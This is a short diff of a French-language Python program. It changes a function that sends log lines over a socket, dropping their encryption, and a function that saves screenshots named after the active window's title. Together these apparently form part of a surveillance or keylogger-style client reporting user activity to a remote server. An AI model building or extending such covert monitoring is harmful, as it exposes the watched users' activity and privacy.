@@ -66,14 +66,13 @@ def envoyer_log(message):
     if sock is None:
         return
     try:
-        encrypted = fernet.encrypt(message.encode()).decode()
-        data = b"LOG|" + encrypted
+        data = f"LOG|{message}".encode()
         sock.sendall(data + b"\n")
     except Exception as e:
         print(f"Erreur envoi log : {e}")
 
 def capture_ecran(window_title):
-    time.sleep(0.5)
+    time.sleep(1)
     now = datetime.now().strftime("%Y%m%d_%H%M%S")
     safe_title = "".join(c if c.isalnum() else "_" for c in window_title)
     filename = f"{now}_{safe_title}.png"
